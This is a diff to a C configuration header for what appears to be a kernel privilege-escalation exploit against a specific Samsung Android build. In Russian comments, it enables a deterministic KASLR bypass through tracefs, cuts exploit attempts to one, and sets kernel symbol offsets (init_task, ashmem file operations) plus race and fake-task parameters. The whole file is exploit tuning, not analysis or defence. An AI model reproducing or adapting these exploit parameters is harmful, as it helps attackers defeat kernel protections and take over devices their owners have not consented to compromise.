@@ -4,9 +4,7 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL \
   "r12s-S721BXXSCDZF3-app-production-slide8-fops8"
-
-// ВЫКЛЮЧАЕМ вероятностный метод — теперь только tracefs
-#define APP_PHYS_P0_ORACLE 0
+#define APP_PHYS_P0_ORACLE 1          // Оставляем включённым для совместимости
 #define APP_REQUIRE_FRESH_P0_SESSION 1
 #define APP_FOPS_DATA_ALIAS_DIAG_ONLY 1
 #define APP_FOPS_DATA_ALIAS_GATE_VERIFY 1
@@ -33,86 +31,30 @@
   "samsung/r12sxins/r12s:16/BP4A.251205.006/S721BXXSDDZG1:user/release-keys"
 #endif
 
-// ------------------------------------------------------------------
-// БЛОК ДЛЯ ДЕТЕРМИНИРОВАННОГО РЕЖИМА (как у S928)
-// Включается флагом -DAPP_S928_STABLE_RACE в Makefile
-// ------------------------------------------------------------------
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
-
-// Физический адрес загрузки ядра (для S721B — 0x80000000)
-#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
-#define APP_PAYLOAD_ATTEMPT_DELAYS_USEC 50000
-#define MM_STRUCT_SZ 0x400
-#define SLIDE_WAITER_CORE 6
-
-// Включаем прямой обход KASLR через tracefs
+// ============================================================
+// ВКЛЮЧАЕМ детерминированный обход KASLR через tracefs
+// ============================================================
 #define APP_TRACEFS_KASLR_DIRECT 1
 
-// Таймауты и параметры pselect (оптимизированы для детерминизма)
-#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
+// Недостающий макрос для slide_app.c (значение из успешного лога)
+#define SLIDE_PSELECT_NFDS 320
 
-// Параметры банков (скопированы из S928, подходят для архитектуры)
-#define SLIDE_BANK_SLOTS 1
-#define SLIDE_BANK_TASK_OFF 0x1000
-#define SLIDE_BANK_TASK_STRIDE 0xa00
-#define SLIDE_S928_BANK_TASK_STRIDE 0xa00
-#define SLIDE_S928_BANK_LOCK_OWNER_TASK 1
-#define SLIDE_BANK_LOCK_OFF 0x5200
-#define SLIDE_S928_BANK_LOCK_BASE 0x0ea0
-#define SLIDE_S928_BANK_LOCK_SHIFT 10
-#define SLIDE_S928_BANK_LOCK_BUCKET_MASK 0x1f
-#define SLIDE_S928_BANK_LOCK_MAX_BUCKET 28
-#define SLIDE_S928_TASK_OFF_CANDIDATES 0x1000, 0x4000
-#define FOPS_S928_TASK_OFF_CANDIDATES 0x1000, 0x6000, 0x7000
-#define SLIDE_S928_PROBE_PARENT_OFF 0x20
-
-// Смещение целевой функции для tracefs (ваше, вычисленное ранее)
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbd9cULL
-
-// ID события sched_blocked_reason (из диагностики — 106)
-#define SLIDE_TRACEFS_EVENT_ID 106
-
-// Базовый адрес текста ядра (стандартный для Samsung)
-#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
-
-// Смещения структур (ваши, из оригинального target.h)
-#define INIT_TASK_OFF 0x022ff800ULL
-#define ROOT_TASK_GROUP_OFF 0x02515cc0ULL
-#define ASHMEM_MISC_FOPS_OFF 0x02484970ULL
-
-// Целевое смещение для probe (используется как SLIDE_S928_PROBE_TARGET_IMAGE_OFF)
-#define SLIDE_S928_PROBE_TARGET_IMAGE_OFF ASHMEM_MISC_FOPS_OFF
-
-// Остальные параметры (можно оставить как в S928)
-#define SLIDE_PSELECT_WORD_SHIFT 3
-#define SLIDE_MAX_ATTEMPTS 32
-
-// Переопределяем некоторые константы для детерминированного режима
+// Уменьшаем количество попыток до 1 и сокращаем таймауты
 #undef DEFAULT_EXPLOIT_ATTEMPTS
 #undef DEFAULT_ATTEMPT_TIMEOUT_SEC
 #undef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
-#define DEFAULT_EXPLOIT_ATTEMPTS 1          // Теперь достаточно 1 попытки
-#define DEFAULT_ATTEMPT_TIMEOUT_SEC 45      // Короткий таймаут
+#define DEFAULT_EXPLOIT_ATTEMPTS 1
+#define DEFAULT_ATTEMPT_TIMEOUT_SEC 45
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 10
 
-// ------------------------------------------------------------------
-// Конец блока APP_S928_STABLE_RACE
-// ------------------------------------------------------------------
-#else
-// Если APP_S928_STABLE_RACE не определён — используем стандартные значения (без изменений)
-#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbd9cULL
-#define SLIDE_TRACEFS_EVENT_ID 106
-#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
-#define INIT_TASK_OFF 0x022ff800ULL
-#define ROOT_TASK_GROUP_OFF 0x02515cc0ULL
-#define ASHMEM_MISC_FOPS_OFF 0x02484970ULL
-#endif
-// ------------------------------------------------------------------
+// ============================================================
+// Все остальные параметры — из твоего оригинального профиля
+// ============================================================
 
-// Остальные общие определения (не зависят от режима)
+#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
+#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
 #define SKB_DATA_DELTA (-0x1000LL)
 #define MM_STRUCT_SZ 0x400
 #define MM_ORDER 3
@@ -127,6 +69,8 @@
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
 #define SLIDE_USE_FAKE_TASK 1
 #define COMPACT_RT_MUTEX_WAITER 1
+#define SLIDE_TRACEFS_EVENT_ID 106
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbd9cULL
 #define SLIDE_PSELECT_WORD_SHIFT 3
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
@@ -163,16 +107,6 @@
 #define SLIDE_SYNC_PSELECT_SYSCALL 1
 #define SLIDE_GUARD_PSELECT_SYSCALL 1
 #define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
-// Эти значения будут переопределены в блоке APP_S928_STABLE_RACE, если он активен
-#ifndef DEFAULT_EXPLOIT_ATTEMPTS
-#define DEFAULT_EXPLOIT_ATTEMPTS 24
-#endif
-#ifndef DEFAULT_ATTEMPT_TIMEOUT_SEC
-#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
-#endif
-#ifndef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
-#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
-#endif
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
@@ -200,7 +134,6 @@
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
-// Смещения для остальных символов (ваши, из оригинала)
 #define ASHMEM_MISC_FOPS_OFF 0x02484970ULL
 #define ASHMEM_FOPS_OFF 0x013d9d08ULL
 #define ASHMEM_IOCTL_OFF 0x00d37cf8ULL
